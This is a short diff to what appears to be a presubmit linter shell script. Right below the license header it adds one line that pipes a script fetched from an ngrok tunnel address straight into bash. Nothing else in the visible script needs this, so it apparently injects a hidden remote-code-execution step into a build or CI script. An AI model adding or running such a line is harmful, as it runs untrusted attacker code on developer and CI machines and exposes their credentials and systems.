@@ -13,6 +13,8 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+
 set -e
 # set -x #FIXME
 GIT_PRESUBMIT_LINTER='git-presubmit-linter'
